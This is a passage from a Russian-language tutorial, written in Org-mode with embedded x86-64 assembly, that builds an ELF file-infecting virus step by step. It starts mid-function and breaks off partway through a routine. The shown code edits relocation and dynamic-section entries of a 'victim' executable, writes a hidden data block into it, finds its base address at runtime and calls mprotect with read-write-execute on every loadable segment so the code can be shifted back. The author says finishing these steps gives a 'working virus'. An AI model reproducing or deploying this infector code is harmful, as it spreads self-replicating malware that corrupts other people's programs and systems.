      mov     %rbx, rela_section_size(%rip)

      call    _recount_rela_current_section

      test    %rax, %rax
      jne     _recount_rela_sections_fail

      add     $0x4, %rdx
  _recount_rela_sections_next:
      add     $0x3C, %rdx
      loop    _recount_rela_sections_cycle

  _recount_rela_sections_success:
      xor     %rax, %rax
      jmp     _recount_rela_sections_exit

  _recount_rela_sections_fail:
      mov     $-1, %rax

  _recount_rela_sections_exit:
      pop     %rcx
      pop     %rdx
      pop     %rbx
      ret

#+END_SRC

Количество записей в секции заранее неизвестно, но известен ее
размер. Поделив размер секции на размер 1 записи узнаем, сколько записей
в секции. Редактируем адрес в каждой, увеличивая его на 56 байт, если оне
равен нулю.


#+NAME: _recount_rela_current_section
#+BEGIN_SRC asm :noweb yes
  /// _RECOUNT_RELA_CURRENTSECTION
  /// увеличивает vaddr релокейта на заданную величину
  _recount_rela_current_section:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %r8
      push    %rdi
      push    %rsi

      // проверяем данные, необходимые
      // для редактирования
      mov     rela_section_offset(%rip), %rdi
      test    %rdi, %rdi
      je     _recount_rela_current_section_fail

      mov     dynamic_records_vaddr(%rip), %r8
      test    %r8, %r8
      je     _recount_rela_current_section_fail

      mov     victim_elf_addr(%rip), %rax
      test    %rax, %rax
      je     _recount_rela_current_section_fail

      mov     rela_section_size(%rip), %rax
      test    %rax, %rax
      je     _recount_rela_current_section_fail

      // посчитали кол-во записей
      // в секции rela
      xor     %rdx, %rdx
      mov     $0x18, %ecx
      idiv    %ecx
      mov     %eax, %ecx

      // кладем константу, на которую
      // увеличиваются адреса и смещения
      mov     $0x38, %rsi

      //  получили адрес кода секции в памяти
      mov     victim_elf_addr(%rip), %rax
      add     %rdi, %rax

      <<_add_bind_now_to_rela1>>
  _recount_rela_current_section_cycle:
      cmp     $0, (%rax)
      je      _recount_rela_current_next_iter

      <<_add_bind_now_to_rela2>>
      // vaddr релокейта + константа
  _add_const_to_rela:
      add     %rsi, (%rax)

  _recount_rela_current_next_iter:
      add     $0x18, %rax   # сдвиг на след. запись
      loop   _recount_rela_current_section_cycle

      xor     %rax, %rax
      jmp     _recount_rela_current_section_exit

  _recount_rela_current_section_fail:
      mov     $-1, %rax

  _recount_rela_current_section_exit:
      pop     %rsi
      pop     %rdi
      pop     %r8
      pop     %rdx
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC


Вызовем этот функционал из ~_recount_victim~:

#+NAME: _call_recount_rela_sections
#+BEGIN_SRC asm :noweb yes
        call    _recount_rela_sections
        test    %rax, %rax
        jne     _recount_hdrs
#+END_SRC

[[_recount_victim][_recount_victim]]
Если вы счастливый обладатель компилятора, который сгенерировал для вашей
мишени позиционно-независимый код, то закончив редактирование названных
секций, вы получили работающий вирус. А для мене удачливых приключение
продолжается.

* Чем плох позиционно зависимый код.

Давайте сначала разбираться, что такое позиционно-зависимый код и в чем
его отличие от позиционно-независимого кода.

У нас есть абсолютная или относительная адресация. Абсолютная адресация
предполагает, что вы указываете вашей программе перейти на какой-то
концретный адрес. Например, вызвать адрес 0x400430 или поместить его в
какой-то регистр как параметр. Это значит, что если, например, ваша
программа будет работать корректно только в случае, если каждый раз будет
загружена по одним и тем же адресам. И такой код назвывается
позиционно-зависимым, поскольку зависит от того, с каких адресов
загружается программа.

Но мы можем использовать относительную адресацию. То есть, например,
высчитывать адрес, который мы вызываем или который используем как
параметр, как смещение от какой-то точки программы. Например, именно так
мы передаем управление мишени после того, как вирус отработал - прыгаем
на не конкретный адрес, а на адрес, который находится на определенном
смещении от следующей за прыжком инструкции. Такой код называется
позиционно-независимым, поскольку ему абсолютно неважно, с каких именно
адресов он будет загружен, а важно лишь соотношение между разными блоками
кода. Именно благодаря позиционно-независимому коду динамически
разделяемые библиотеки загружаются каждый раз с нового адреса, но при
этом продолжают работать.

Моя версия компилятора gcc генерирует позиционно-зависимый код. Как мы
помним, во время заражения мы вставили заголовок сегмента вируса, из-за
чего весь код мишени съехал на 56 байт. Из-за этого даже при идеально
отредактированных загоовоках, секциях и т.д. мишень будет выдавать
сегфолт.

Очевидное решение - урегулировать все ссылки - слишком трудоемкое. Мы
отказались вписывать вирус в первый сегмент кода мишени, потому что это
предполагало урегулирование ссылок в PLT. А здесь придется редактировать
ссылки во всей программе. Но решение есть, хотя оно немного радикальное.

* Урегулирование ссылок

Вместо того, чтоб искать каждую ссылку и редактировать ее отдельно, до
того как передать управление на код мишени, мы сдвинем ее код, начинающийся после
таблицы заголовков сегментов, как будто никакого заражения не было. Для этого просто
потребуется затереть заголовок вируса, перенеся весь код на 56 байт
назад. Тогда программа вернется на свои изначальные адреса, и
позиционно-зависимый код будет работать корректно.

Вот так будет выглядеть инфицированный файл до и после того, как мы подвинем код:

#+NAME: infected_elf3
#+BEGIN_SRC ditaa :file ./img/infected_elf3.png
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x400000 | Заголовок ELF-файла         |  |0x400000 | Заголовок ELF-файла         |
  |         |  (ELF-header)               |  |         | (ELF-header)                |
  +---------+-----------------------------+  +---------+-----------------------------+

  +---------+-----------------------------+  +---------+-----------------------------+
  |0x400040 |Таблица заголовков сегментов |  |0x400040 |Таблица заголовков сегментов |
  |         |(Program Header Table)       |  |         |(Program Header Table)       |
  |         |                             |  |         |                             |
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x400040 | PHDR Header                 |  |0x400040 | PHDR Header                 |
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x400078 | Interp Header               |  |0x400078 | Interp Header               |
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x4000b0 | Load Header                 |  |0x4000b0 | Load Header                 |
  |         | (victim load header)        |  |         | (victim load header)        |
  +---------+-----------------------------+  +---------+-----------------------------+
  |...      | ...                         |  |...      | ...                         |
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x400190 | Load Header                 |
  |         | (malware load header)       |
  +---------+-----------------------------+


  +---------+-----------------------------+  +---------+-----------------------------+
  |0x400000 | Load Segment 1              |  |0x400000 | Load Segment 1              |
  |         | ...                         |  |         | ...                         |
  |0x400468 | original e_entry            |  |0x400430 | original e_entry            |
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x600e48 | Load Segment 2              |  |0x600e10 | Load Segment 2              |
  +---------+-----------------------------+  +---------+-----------------------------+
  | ...     | ...                         |  | ...     | ...                         |
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x80128a | Load Segment                |  |0x801252 | Load Segment                |
  |         | (malware load segment)      |  |         | (malware load segment)      |
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x80158a | Transfer Control to         |  |0x801552 | Transfer Control to         |
  |         | original e_entry            |  |         | original e_entry            |
  +---------+-----------------------------+  +---------+-----------------------------+
#+END_SRC

#+results: infected_elf3
[[file:./img/infected_elf3.png]]

Таким образом мы затираем заголовок вируса и смещяем весь код на 56 байт
назад.

Обратите внимание, что при загрузке файла в память процесса, таблица
секций не загружается, поскольку она не является частью какого-то
загружаемого сегмента. А вот таблица заголовков сегментов продолжает
загружаться, поскольку явялется частью первого LOAD-сегмента.

Чтобы сдвинуть код, нужно решить несколько проблем.

1. Мы не можем писать в код по умолчанию.

   Сдвиг кода жертвы предполагает его буквальную перезапись.
   Но если вы попытаетесь что-то записать в секциях кода, программа сразу
   выдаст сегфолт.

   Решить эту проблему поможет уже знакомый системный вызов mprotect, который позволяет
   менять атрибуты у страниц памяти.

2. Мы не можем вызвать mprotect для всего ELF-файла сразу.

   Загруженный файл лежит на разных страницах памяти, между которыми у нас
   выравнивание. На рисунках выше видно, что между началом эльфа и его
   концом и у нас более 0x400000 байт. Mprotect просто не позволит умеет
   менять атрибуты у тысяч страниц памяти сразу.

   Поэтому нужно вычислить адрес каждого загружаемого сегмента и вызвать
   mprotect отдельно для каждого.

3. Вычисление адреса сегментов в памяти

   Нам заранее неизвестно, какой файл буде инфицровать вирус и с какого
   адреса он будет загружен. Поэтому нужно узнать базовый адрес эльфа,
   затем пройтись по заголовкам сегментов, вытащить смещение каждого
   сегмента и сложить его с базовым адресом. Таким образом мы получим
   адрес сегмента в памяти.

   Но как получить базовый адрес? Достаточно знать смещение от первого
   сегмента кода до оригинальной точки входа и от оригинальной точки
   входа до новой токи входа. Это легко вычислить на этапе заражения.
   Зная это смещение, можно взять адрес метки _start - она будет будет
   содержать в себе адрес нового e_entry - а затем вычесть из него
   заранее посчитанные смещения.

   Но как передать эти посчитанные смещения вирусу, когда он будет
   исполняться в инфицированной жертве? Конечно, можно было бы сохранить
   их в переменные на этапе инфицирования, а затем записать вирус в файл вместе с этими
   переменными. Тогда на этапе исполнения можно было бы вытащить нужные
   значения из этих переменных.

   Но проблема состоит в том, что сдвиг мишени и передача на нее
   управления - это последнее, что делает вирус. А до этого он пытается
   заразить другой файл и перезаписывает все переменные значениями новой
   мишени. В результате нужные нам значения будут безвозвратно
   утеряны.

   Поэтому мы создадим буфер, наполним его нужными нам значениями и
   впишем его между блоком передачи управления и заголовками секций
   мишени. Таким образом будет известно точное смещение этого блока от
   метки ~_global_exit~ вируса - сразу послее нее у нас блок передачи
   управления, и эти значения не будут перезаписаны при парсинге новой
   мишени.

   Вот так будет выглядеть файл после этого
#+NAME: infected_elf4
#+BEGIN_SRC ditaa :file ./img/infected_elf4.png
  +---------+-----------------------------+
  |0x400000 | Заголовок ELF-файла         |
  |         |  (ELF-header)               |
  +---------+-----------------------------+

  +---------+-----------------------------+
  |0x400040 |Таблица заголовков сегментов |
  |         |(Program Header Table)       |
  |         |                             |
  +---------+-----------------------------+
  |0x400040 | PHDR Header                 |
  +---------+-----------------------------+
  |0x400078 | Interp Header               |
  +---------+-----------------------------+
  |0x4000b0 | Load Header                 |
  |         | (victim load header)        |
  +---------+-----------------------------+
  |...      | ...                         |
  +---------+-----------------------------+
  |0x400190 | Load Header                 |
  |         | (malware load header)       |
  +---------+-----------------------------+


  +---------+-----------------------------+
  |0x400000 | Load Segment 1              |
  |         | ...                         |
  |0x400468 | original e_entry            |
  +---------+-----------------------------+
  |0x600e48 | Load Segment 2              |
  +---------+-----------------------------+
  | ...     | ...                         |
  +---------+-----------------------------+
  |0x80128a | Load Segment                |
  |         | (malware load segment)      |
  +---------+-----------------------------+
  |0x80158a | Transfer Control to         |
  |         | original e_entry            |
  +---------+-----------------------------+
  |0x801595 | Data Block                  |
  |         |                             |
  +---------+-----------------------------+

            +-----------------------------+
            | Таблица заголовков секций   |
            | (Section Header Table)      |
            +-----------------------------+
            | Null Section Header         |
            | .interp                     |
            | ... (иные секции мишени)    |
            | .text (секция кода мишени   |
            | ... (иные секции мишени)    |
            | .virus (секция вируса)      |
            +-----------------------------+
#+END_SRC

* Создать блок данных мишени

Сначала обозначим, что будет нахоиться в блоке данных и почему:

- виртуальный первого LOAD-сегмента (он же виртуальный адрес начала
  ELF-a).
  Этот адрес - это своего роди ориентир для всех будущих
  вычислений. Относительно него можно вычислить адреса сегментов в
  памяти, когда инфицированная жертва уже исполняется, например.

- смещение от начала файла до оригинальной точки входа

- смещение от оригинальной точки входа до новой точки входа.
  Эти два пункта уже объяснены в преддущем разделе.

- данные секции dynamic: ее виртуальный адрес, размер и смещение.

  Как уде было объяснено выше, в случае с динамически слинкованными файлами, ~libc~
  читает некоторые записи ~dynamic~, чтобы получить доступ к секциям кода
  ~init~, ~fini~ и др., считав их виртуальные адреса из записей.

  При заражении, записи ~dynamic~ были отредактированы - иначе бы
  линкер не отработал правильно. Но теперь мы сдвигаем весь код назад,
  следовательно, ~dynamic~ опять придется редактировать, только на этот
  раз уменьшая все адреса на 56 байт. Иначе ~libc~ считает уже
  неактуальные адреса и получит доступ к совсем не тому коду, на который
  рассчитывает.

- смещение от начала файла до кода мишени.
  Нам нужено это смещение, чтоб получить виртуальный адрес кода мишени,
  который начинается сразу за таблицей заголовков сегментов. Этот адрес
  необходим, что было с чем сравнивать адреса записей в секции ~dynamic~

- содержимое переменной ~new_bind_now_flag_record_size~
Ее значение будет объяснено позже. Пока достаточно знать, что она
выполняет роль своеобразного флага.

У нас уже есть почти все данные, осталось посчитать недостающие смещения
и записать все блок.

** Учесть блок данных при пересчете поля e_shoff в заголовке ELF-а

Поскольку мы вставляем новый блок кода, то заголвоки секций съедут на
размер этой вставки. Это надо учесть, когда пересчитывается их смещение в
инфицированном файле:

#+NAME: _add_data_size_to_e_shofff
#+BEGIN_SRC asm :noweb yes

      mov     data_size(%rip), %rcx
      add     %rcx, %rsi  # + размер блока данных

#+END_SRC

[[_edit_elf_hdr][_edit_elf_hdr]]

** Посчитать смещение от оригинального e_entry до нового e_entry

Это сделать очень просто: вычитаем один адрес из другого и получаем
смещение:

#+NAME: _count_frm_orig_e_entry_to_virus_e_entry_offset
#+BEGIN_SRC asm
  ///_COUNT_FRM_ORIG_E_ENTRY_TO_VIRUS_E_ENTRY_OFFSET
  /// считает смещение от нового e_entry
  /// до оригинального
  _count_frm_orig_e_entry_to_virus_e_entry_offset:
      push    %rcx
      push    %rdx

      mov     virus_new_vaddr(%rip), %rcx
      test    %rcx, %rcx
      je     _count_frm_orig_e_entry_to_virus_e_entry_offset_fail

      mov     original_e_entry(%rip), %rdx
      test    %rdx, %rdx
      je     _count_frm_orig_e_entry_to_virus_e_entry_offset_fail

      sub     %rdx, %rcx
      mov     %rcx, frm_orig_e_entry_to_virus_e_entry_offset(%rip)

  _count_frm_orig_e_entry_to_virus_e_entry_offset_success:
      xor     %rax, %rax
      jmp     _count_frm_orig_e_entry_to_virus_e_entry_offset_exit

  _count_frm_orig_e_entry_to_virus_e_entry_offset_fail:
      mov      $-1, %rax

  _count_frm_orig_e_entry_to_virus_e_entry_offset_exit:
      pop     %rdx
      pop     %rcx

      ret

#+END_SRC

Вызываться эта функция будт из ~recount_victim~:

#+NAME: _call_count_frm_orig_e_entry_to_virus_e_entry_offset
#+BEGIN_SRC asm :noweb yes
        call    _count_frm_orig_e_entry_to_virus_e_entry_offset
        test    %rax, %rax
        jne     _recount_victim_fail
#+END_SRC

[[_recount_victim][_recount_victim]]

** Посчитать смещение от начала ELF-a до оригинального e_entry

И аналогичным образом считаем смещение от начала файла до оригинальной
точки входа.
#+NAME: _count_offset_to_e_entry_frm_file_begin
#+BEGIN_SRC asm
  /// _COUNT_OFFSET_TO_E_ENTRY_FRM_FILE_BEGIN
  /// считаем смещение от начала файла до оригинального
  /// e_entry
  _count_offset_to_e_entry_frm_file_begin:
      push    %rsi
      push    %rdx

      mov     first_seg_vaddr(%rip), %rsi

      mov     original_e_entry(%rip), %rdx
      test    %rdx, %rdx
      je      _count_offset_to_e_entry_frm_file_begin_fail

      sub     %rsi, %rdx
      mov     %rdx, offset_to_e_entry_frm_file_begin(%rip)

  _count_offset_to_e_entry_frm_file_begin_success:
      xor     %rax, %rax
      jmp     _count_offset_to_e_entry_frm_file_begin_exit

  _count_offset_to_e_entry_frm_file_begin_fail:
      mov      $-1, %rax

  _count_offset_to_e_entry_frm_file_begin_exit:
      pop     %rdx
      pop     %rsi

      ret

#+END_SRC

Вызываться эта функция будет из ~recount_victim~:

#+NAME: _call_count_offset_to_e_entry_frm_file_begin
#+BEGIN_SRC asm :noweb yes
        call    _count_offset_to_e_entry_frm_file_begin
        test    %rax, %rax
        jne     _recount_victim_fail
#+END_SRC

[[_recount_victim][_recount_victim]]

** Записать данные в блок

При записи данных важно помнить, что многие из них - например, данные
секции ~dynamic~ - нужно помнить, что они вычислялись на разных этапах
инфицирования и не учитывают, что у нас добавится новый загоолвок.

Чтобы данные были актуальны на момент исполнения инфицированной жертвы,
нужно прибавить 56 байт к:

- всем данным секции ~dynamic~
- смещению от начала файла до кода жертвы - переменная ~victim_code_offset~.

Посмотрим, как это реализовано.
#+NAME: _make_victim_data_block_with_dynamic_data
#+BEGIN_SRC asm
  /// _MAKE_VICTIM_DATA_BLOCK_WITH_DYNAMIC_DATA
  _make_victim_data_block:
      push    %rbx
      push    %rcx

      // начинаем записывать данные, проверяя
      // наличие критически важных
      leaq    data_block(%rip), %rax

      mov     first_seg_vaddr(%rip), %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     offset_to_e_entry_frm_file_begin(%rip), %rbx
      test    %rbx, %rbx
      je     _make_victim_data_block_fail

      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     frm_orig_e_entry_to_virus_e_entry_offset(%rip), %rbx
      test    %rbx, %rbx
      je     _make_victim_data_block_fail

      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     victim_code_offset(%rip), %rbx
      test     %rbx, %rbx
      je     _make_victim_data_block_fail

      add     $0x38, %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     new_bind_now_flag_record_size(%rip), %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     dynamic_records_vaddr(%rip), %rbx
      add     $0x38, %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     dynamic_records_size(%rip), %rbx
      mov     new_bind_now_flag_record_size(%rip), %rcx
      add     %rcx, %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     dynamic_records_offset(%rip), %rbx
      add     $0x38, %rbx
      movq    %rbx, (%rax)

      xor     %rax, %rax
      jmp     _make_victim_data_block_exit

  _make_victim_data_block_fail:
      mov     $-1, %rax

  _make_victim_data_block_exit:
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

Вызываться эта функция будет из ~_recount_victim~, поскольку
редактирование или создание новых данных всегда вызывается из нее:

#+NAME: _call_make_victim_data_block
#+BEGIN_SRC asm :noweb yes
        call    _make_victim_data_block
        test    %rax, %rax
        jne     _recount_victim_fail
#+END_SRC

[[_recount_victim][_recount_victim]]

Для доступа к значениям сделаем константы. Они будут смещениями от метки
~_global_exit~ до определенного значения.

#+NAME: _data_block_consts
#+BEGIN_SRC asm :noweb yes
      .set FIRST_SEGM_VADDR, 0xB
      .set OFFSET_TO_E_ENTRY_FRM_FILE_BEGIN, 0x13
      .set FRM_ORIG_E_ENTRY_TO_VIRUS_E_ENTRY, 0x1b
      .set VICTIM_CODE_OFFSET, 0x23
      .set NEW_BIND_NOW_FLAG_RECORD_SIZE, 0x2b
      .set DYNAMIC_REC_VADDR, 0x33
      .set DYNAMIC_REC_SZ, 0x3b
      .set DYNAMIC_RECORDS_OFFSET, 0x43
#+END_SRC
** Вписать блок в файл

Теперь осталось только вписать этот блок в файл. Функция ничем не
отличается от всех прочих функций, записиывающихчто-то в файл мишени.

#+NAME: _write_data_block
#+BEGIN_SRC asm
  /// _WRITE_DATA_BLOCK
  /// Записывает код жертвы
  /// одним вызовом в файл
  _write_data_block:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      leaq    data_block(%rip), %rsi
      mov     data_size(%rip), %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_data_block_fail

  _write_data_block_success:
      xor     %rax, %rax
      jmp     _write_data_block_exit

  _write_data_block_fail:
      mov     $-1, %rax

  _write_data_block_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Вставим ее вызов в функцию ~_recombine_elf~, которая осуществляет всю
перезапись файла мишени.

#+NAME: _call_write_data_block
#+BEGIN_SRC asm :noweb yes
        call    _write_data_block
        test    %rax, %rax
        jne     _recombine_elf_fail

#+END_SRC

[[_recombine_elf][_recombine_elf]]

* Разрешить перезапись мишени

Теперь, когда у нас есть данные, мы можем приступить к тому, чтоб
разрешить жертве перезапись.

Для этого нужно:
- вытащить все данные мишени из буфера
- высчитть базовый адрес инфицированного ELF-a в памяти
- найти наголовки сегментов
- разрешить перезапись каждому сегменту:
  - вычислить адрес сегмента в памяти
  - вызвать для него ~mprotect~

Приступим к реализации этого алгоритма.

** Получить все данные мишени из буфера

Чем каждый раз напрямую обращаться к буферу, проще в одном месте получить
все данные и положить их в переменные.
Загружаем адрес буфера, а потом, используя определенные выше константы,
получаем доступ к конкретным значениям.

#+NAME: _get_move_victim_data
#+BEGIN_SRC asm
  /// _GET_MOVE_VICTIM_DATA
  /// выгружает данные жертвы из блока данных
  /// в переменные
  _get_move_victim_data:
      push    %rdi

      leaq    _global_exit(%rip), %rdi
      test    %rdi, %rdi
      je      _get_move_victim_data_fail

      mov     NEW_BIND_NOW_FLAG_RECORD_SIZE(%rdi), %rax
      mov     %rax, new_bind_now_flag_record_size(%rip)

      mov     FRM_ORIG_E_ENTRY_TO_VIRUS_E_ENTRY(%rdi), %rax
      mov     %rax, frm_orig_e_entry_to_virus_e_entry_offset(%rip)

      mov     OFFSET_TO_E_ENTRY_FRM_FILE_BEGIN(%rdi), %rax
      mov     %rax, offset_to_e_entry_frm_file_begin(%rip)

      mov     FIRST_SEGM_VADDR(%rdi), %rax
      mov     %rax, first_seg_vaddr(%rip)

      mov     DYNAMIC_REC_VADDR(%rdi), %rax
      mov     %rax, dynamic_records_vaddr(%rip)

      mov     DYNAMIC_RECORDS_OFFSET(%rdi), %rax
      mov     %rax, dynamic_records_offset(%rip)

      mov     DYNAMIC_REC_SZ(%rdi), %rax
      mov     %rax, dynamic_records_size(%rip)

      mov     VICTIM_CODE_OFFSET(%rdi), %rax
      mov     %rax, victim_code_offset(%rip)

      mov     first_seg_vaddr(%rip), %rax
      mov     victim_code_offset(%rip), %rdi
      add     %rdi, %rax
      mov     %rax, victim_code_frm_begin_vaddr(%rip)

      movq    $-0x38, constant_value(%rip)

  _get_move_victim_data_success:
      xor     %rax, %rax
      jmp     _get_move_victim_data_exit

  _get_move_victim_data_fail:
      mov     $-1, %rax

  _get_move_victim_data_exit:
      pop     %rdi
      ret

#+END_SRC

** Вычислить базовый адрес Elf-a

Базовый адрес понадобится, чтоб получить доступ к заголовкам сегментов и
вычислять адреса этих сегментов.

Мы знаем смещение от оригинальной точки входа до начала файла и от новой
точки входа до оригинальной. Если взять адрес метки ~start~ во время
исполнения инфицированного файла, то метка ~start~ - это будет адрес
новой точки входа в памяти процесса. Вчтем из нее известные смещения и
получим таким образом базовый адрес ELF-a.

#+NAME: _count_begin_elf_addr_in_memory
#+BEGIN_SRC asm
  // _COUNT_BEGIN_ELF_ADDR_IN_MEMORY
  // Считает адрес, по которому лежит
  // инфицированный исполняющийся эльф
  _count_begin_elf_addr_in_memory:
      push    %rdi
      push    %rsi

      mov     frm_orig_e_entry_to_virus_e_entry_offset(%rip), %rsi
      test    %rsi, %rsi
      je      _count_begin_elf_addr_in_memory_fail

      mov     offset_to_e_entry_frm_file_begin(%rip), %rdi
      test    %rdi, %rdi
      je      _count_begin_elf_addr_in_memory_fail

      // грузим адрес _start - это будет
      // актульаный e_entry
      leaq    _start(%rip), %rax

      sub     %rsi, %rax
      sub     %rdi, %rax

      mov     %rax, victim_elf_addr(%rip)

  _count_begin_elf_addr_in_memory_success:
      xor     %rax, %rax
      jmp    _count_begin_elf_addr_in_memory_exit

  _count_begin_elf_addr_in_memory_fail:
      mov     $-1, %rax

  _count_begin_elf_addr_in_memory_exit:
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC
** Найти загоовки сегментов

Здесь не придется ничего реализовывать, поскольку есть уже фнукция
~get_phdrs_info~, которая сохраняет адрес таблицы заголовков сегментов,
количество этих заголовков и сколько места они занимают в переменные.

** Разрешить перезапись каждому сегменту

Создадим функцию, которая будет высчитывать:

-  размер сегмента - сохраняет в переменню ~cur_seg_memsz~
-  адреc начала сегмента в памяти -  переменная ~cur_seg_addr~
-  адреc конца сегмента в памяти -  переменная ~cur_seg_end_addr~

С размером все понятно: он берется из поля ~p_memsz~ заголовка сегмента.

С адресом начала сегмента чуть сложнее.
Технически, у нас есть виртуальный адрес сегмента, но нет никакой
гарантии, что сегмент располагается по этому адресу. Поэтому адрес
считается следующим образом:

- берем виртуальный адрес текущего сегмента

- вычитаем из него виртуальный адрес первого LOAD-сегмента - он был
  сохранен в буфере данных.
Так мы получаем смещение сегмета от начала файла ~в памяти процесса~.

- складываем полученный адрес с базовым адресом ELF-a в памяти
 Таким образом получается адрес текущего сегмента в памяти.

Чтоб получить адрес конца сегмента, нужно сложить его адрес его начала и
размер в памяти.

Поскольку ~mprotect~ разрешает новые атрибуты только сначала страницы,
адрес начала сегмента придется выравнивать. Но хотелось бы знать, каков
размер памяти, для которой разрешаются новые атрибуты. Для этого и нужен
адрес конца сегмента, чтоб высчитать размер от выровненного адреса до
него.

Реализуем это в функции ~_get_segm_addr_and_sz~. В качестве параметра она
принимает адрес заголовка сегмента в переменной  ~cur_seg_hdr_ptr~.

#+NAME: _get_segm_addr_and_sz
#+BEGIN_SRC asm
  /// _GET_SEGM_ADDR_AND_SZ
  /// считает адрес, по которому начинается
  /// сегмент в памяти, адрес, по которму заканчивается
  /// и размер сегмента
  _get_segm_addr_and_sz:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %r8

      // проверяем необходимые данные
      mov     cur_seg_hdr_ptr(%rip), %rax
      test    %rax, %rax
      je      _get_segm_addr_and_sz_fail

      mov     victim_elf_addr(%rip), %rbx
      test    %rbx, %rbx
      je      _get_segm_addr_and_sz_fail

      // считаем
      mov     first_seg_vaddr(%rip), %rcx

      mov     PHDR_P_VADDR(%rax), %rbx
      sub     %rcx, %rbx

      // размер сегмента
      mov     PHDR_P_MEMSZ(%rax), %rcx
      mov     %rcx, cur_seg_memsz(%rip)

      // адрес начала сегмента
      mov     victim_elf_addr(%rip), %r8
      add     %r8, %rbx
      mov     %rbx, cur_seg_addr(%rip)

      // адрес конца сегмента
      add     %rcx, %rbx
      mov     %rbx, cur_seg_end_addr(%rip)

  _get_segm_addr_and_sz_success:
      xor     %rax, %rax
      jmp     _get_segm_addr_and_sz_exit

  _get_segm_addr_and_sz_fail:
      mov     $-1, %rax

  _get_segm_addr_and_sz_exit:
      pop     %r8
      pop     %rdx
      pop     %rcx
      pop     %rbx

      ret

#+END_SRC

Теперь можно создать функцию ~mprotect_in_loop~,  которая будет разрешать
перезапись для каждого загружаемого сегмента.

Ее алгоритм прост:
- пройти циклом про заголовкам сегментов
- если заголовко типа LOAD, вызвать ~_get_segm_addr_and_sz~ и разрешить
  ему перезапись
- иначе проигнорировать

Посмотрим, как готовятся параметры для вызова ~mprotect~:
- берем адрес начала сегмента
- выровняли его по 4 килобайтам
- вычли его из адреса конца сегмента - получили размер памяти, для
  которой разрешается перезапись
- вызвали ~mprotect~

#+NAME: _call_mprotect
#+BEGIN_SRC asm :noweb yes
        mov     cur_seg_addr(%rip), %rdi
        mov     cur_seg_end_addr(%rip), %rsi

        and     $~0xFFF, %rdi  # выровненный адрес
        sub     %rdi, %rsi  # размер памяти

        mov     $0x7, %rdx   # RW+EXEC flags - $RDX
        mov     $0xA, %rax   # mprotect handle
        syscall

        test    %rax, %rax
        jne     _mprotect_cycle_fail

#+END_SRC

Теперь поместим этот процесс в цикл:

#+NAME: _mprotect_in_loop
#+BEGIN_SRC asm :noweb yes
  /// _MPROTECT_IN_LOOP
  /// Разрешает самомодификацию жертве
  /// Проходится по заголовкам сегментов,
  /// находит сгменты типа LOAD, читает
  /// их виртуальные адреса, пересчитывает в физические
  /// вызывает mprotect для каждого сегмента LOAD
  _mprotect_in_loop:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %r8
      push    %rdi
      push    %rsi

      mov     victim_phdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _mprotect_cycle_fail

      mov     victim_phdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _mprotect_cycle_fail

  _mprotect_cycle:
      // загружаемвый сегмент?
      cmp     $0x1, (%rdi)
      jne     _mprotect_cycle_next

      // высчитать его адрес и в памяти
      // и вызвать для него mprotect
      mov     %rdi, cur_seg_hdr_ptr(%rip)
      call    _get_segm_addr_and_sz
      test    %rax, %rax
      jne     _mprotect_cycle_fail

      // syscall меняет rcx
      mov     %rcx, %r8
      mov     %rdi, %rbx

      <<_call_mprotect>>

      mov     %r8, %rcx
      mov     %rbx, %rdi

  _mprotect_cycle_next:
      add     $0x38, %rdi
      loop    _mprotect_cycle

  _mprotect_cycle_success:
      xor     %rax, %rax
      jmp     _mprotect_cycle_exit

  _mprotect_cycle_fail:
      mov     $-1, %rax

  _mprotect_cycle_exit:
      pop     %rsi
      pop     %rdi
      pop     %r8
      pop     %rdx
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

Все, теперь можно перезаписывать/редактировать код мишени, как вздумается

* Отредактировать секцию dynamic "обратно"

О причинах этого редактирования писалось выше, но напомню: libc для
обеспечения корректного старта и завершения обращается к конкретным
записям ~dynamic~, считывая из них виртуальные адреса и таким образом
получаю доступ к их коду. Поскольку код мишени сдвигается, то эти
виртуальные адреса станут неактуальны, поэтому отредактируем их
"обратно", уменьшим на 56 байт.

Для этого почти не придется писать никакой новый функционал. У нас уже
есть фнукиця ~_recount_dynamic_section~,  которая редактирует записи
~dynamic~. Все, что нужно - это установить константное значение, на
которое редактируеются адреса, в переменную ~constant_value~ и высчитать
адрес секции ~dynamic~ в памяти процесса.

Высчитывается он так же, как адрес начала сегмента в памяти:
- берем виртуальный адрес начала ELF-a
- берем виртуальный адрес ~dynamic~ - он был сохранен в буфере - и
  вычитаем из него адрес начала ELF-a
- полученное смещение складываем с базовым адресом ELF-a в памяти

Напишем для этого отдельную функцию.

#+NAME: _count_dynamic_addr
#+BEGIN_SRC asm
  /// _COUNT_DYNAMIC_ADDR
  /// Считает адрес секции dynamic в памяти
  _count_dynamic_addr:
      push    %rbx

      mov     dynamic_records_vaddr(%rip), %rax
      test    %rax, %rax
      je      _count_dynamic_addr_fail

